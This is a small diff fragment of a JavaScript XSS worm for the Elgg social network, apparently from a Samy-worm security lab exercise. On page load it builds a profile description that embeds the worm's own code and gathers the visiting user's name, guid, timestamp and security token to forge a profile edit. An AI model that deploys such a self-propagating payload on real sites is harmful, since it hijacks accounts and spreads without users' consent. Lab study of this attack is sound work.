@@ -8,7 +8,6 @@ window.onload = function(){
     // Set the content for the description field
     var desc ="&description=SAMY IS MY HERO" + wormCode + "&accesslevel[description]=2";
 
-    //rest of the code is the same as that in the previous approach...
     // Get the name, guid, timestamp, and token
     var name  = "&name=" + elgg.session.user.name;
     var guid  = "&guid=" + elgg.session.user.guid;
